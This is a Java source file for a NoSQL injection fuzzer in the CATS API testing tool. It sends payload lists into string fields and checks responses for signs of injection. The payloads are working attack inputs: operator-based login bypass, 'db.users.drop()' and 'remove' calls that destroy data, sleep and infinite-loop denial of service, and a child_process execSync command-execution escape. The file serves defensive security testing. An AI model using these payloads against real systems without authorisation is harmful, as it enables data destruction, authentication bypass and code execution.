package com.endava.cats.fuzzer.fields;

import com.endava.cats.annotations.FieldFuzzer;
import com.endava.cats.args.SecurityFuzzerArguments;
import com.endava.cats.fuzzer.executor.SimpleExecutor;
import com.endava.cats.fuzzer.fields.base.BaseSecurityInjectionFuzzer;
import com.endava.cats.model.CatsResponse;
import com.endava.cats.model.FuzzingData;
import com.endava.cats.report.TestCaseListener;
import jakarta.inject.Singleton;

import java.util.ArrayList;
import java.util.List;
import java.util.Locale;

/**
 * Fuzzer that sends NoSQL injection payloads in string fields.
 * <p>
 * This fuzzer tests for NoSQL injection vulnerabilities (MongoDB, CouchDB, etc.)
 * by sending common NoSQL injection payloads and analyzing the response for
 * database error messages or other indicators of successful injection.
 * </p>
 */
@Singleton
@FieldFuzzer
public class NoSqlInjectionInStringFieldsFuzzer extends BaseSecurityInjectionFuzzer {

    private static final List<String> TOP_NOSQL_INJECTION_PAYLOADS = List.of(
            "' || '1'=='1",
            "{\"$gt\": \"\"}",
            "{\"$ne\": \"\"}",
            "{\"$where\": \"1==1\"}",
            "{\"$regex\": \".*\"}",
            "[$ne]=1",
            "{ $where: function() { return true; } }",
            "'; db.users.drop(); var foo='",
            "{\"$or\": [{}, {\"foo\": \"bar\"}]}",
            "admin' && this.password.match(/.*/)//+%00"
    );

    protected static final List<String> ALL_NOSQL_INJECTION_PAYLOADS = List.of(
            "' || '1'=='1",
            "'; return true; var foo='",
            "'; return this.password; var foo='",
            "{\"$gt\": \"\"}",
            "{\"$ne\": \"\"}",
            "{\"$ne\": null}",
            "{\"$gt\": undefined}",
            "{\"$where\": \"1==1\"}",
            "{\"$where\": \"this.password.length > 0\"}",
            "{\"$regex\": \".*\"}",
            "{\"$regex\": \"^a\"}",
            "[$ne]=1",
            "[$gt]=",
            "[$regex]=.*",
            "true, $where: '1 == 1'",
            "', $where: '1 == 1'",
            "1, $where: '1 == 1'",
            "{ $where: function() { return true; } }",
            "{ $gt: '' }",
            "{ $ne: 1 }",
            "'; sleep(5000); var foo='",
            "'; while(true){}; var foo='",
            "{\"$or\": [{}, {\"foo\": \"bar\"}]}",
            "{\"$and\": [{}, {\"foo\": \"bar\"}]}",
            "this.constructor.constructor(\"return this\")().process.mainModule.require('child_process').execSync('ls')",
            "db.users.find({$where: function() { return true; }})",
            "'; db.users.drop(); var foo='",
            "'; db.users.remove({}); var foo='",
            "{\"username\": {\"$gt\": \"\"}, \"password\": {\"$gt\": \"\"}}",
            "admin' && this.password.match(/.*/)//+%00",
            "admin' && this.password%00"
    );


    /**
     * Creates a new NoSqlInjectionInStringFieldsFuzzer instance.
     *
     * @param simpleExecutor          the executor used to run the fuzz logic
     * @param testCaseListener        the test case listener for reporting results
     * @param securityFuzzerArguments the security fuzzer arguments
     */
    public NoSqlInjectionInStringFieldsFuzzer(SimpleExecutor simpleExecutor, TestCaseListener testCaseListener,
                                              SecurityFuzzerArguments securityFuzzerArguments) {
        super(simpleExecutor, testCaseListener, securityFuzzerArguments);
    }

    @Override
    protected String getInjectionType() {
        return "NoSQL";
    }

    @Override
    protected List<String> getTopInjectionPayloads() {
        return TOP_NOSQL_INJECTION_PAYLOADS;
    }

    @Override
    protected List<String> getAllInjectionPayloads() {
        return ALL_NOSQL_INJECTION_PAYLOADS;
    }

    @Override
    public String description() {
        return "iterate through each string field and send NoSQL injection payloads to detect NoSQL injection vulnerabilities";
    }

    @Override
    protected InjectionDetectionResult detectInjectionEvidence(CatsResponse response, FuzzingData data) {
        String responseBody = response.getBody() != null ? response.getBody().toLowerCase(Locale.ROOT) : "";
        int responseCode = response.getResponseCode();

        List<String> indicators = new ArrayList<>();

        if (containsExecutableOperator(responseBody)) {
            indicators.add("NoSQL operator executing server-side code");
        }

        if (exposesMongoInternals(responseBody)) {
            indicators.add("MongoDB internal structure");
        }

        if (containsDatabaseError(responseBody) && !indicators.isEmpty()) {
            indicators.add("database error message");
        }

        if (indicators.size() >= 2) {
            String evidenceSummary = String.join(", ", indicators);
            return InjectionDetectionResult.vulnerable(
                    "NoSQL injection vulnerability detected",
                    "Response shows multiple NoSQL indicators (%s). Response code: %d"
                            .formatted(evidenceSummary, responseCode));
        }

        return InjectionDetectionResult.notVulnerable();
    }

    private boolean containsExecutableOperator(String responseBody) {
        boolean hasOperator = responseBody.contains("$where") || responseBody.contains("$regex")
                || responseBody.contains("$gt") || responseBody.contains("$gte")
                || responseBody.contains("$lt") || responseBody.contains("$ne")
                || responseBody.contains("$nin") || responseBody.contains("$or")
                || responseBody.contains("$and");
        boolean hasJsCode = responseBody.contains("function") || responseBody.contains("return")
                || responseBody.contains("this.");
        return hasOperator && hasJsCode;
    }

    private boolean exposesMongoInternals(String responseBody) {
        return responseBody.contains("objectid") || responseBody.contains("_id")
                || responseBody.contains("bson") || responseBody.contains("mongodb")
                || responseBody.contains("collection") || responseBody.contains("db.")
                || responseBody.contains("pipeline");
    }

    private boolean containsDatabaseError(String responseBody) {
        return responseBody.contains("mongoerror") || responseBody.contains("mongodb error")
                || responseBody.contains("query failed") || responseBody.contains("cannot read property")
                || responseBody.contains("unexpected token") || responseBody.contains("invalid operator")
                || responseBody.contains("unknown operator") || responseBody.contains("bad query")
                || responseBody.contains("errmsg");
    }
}
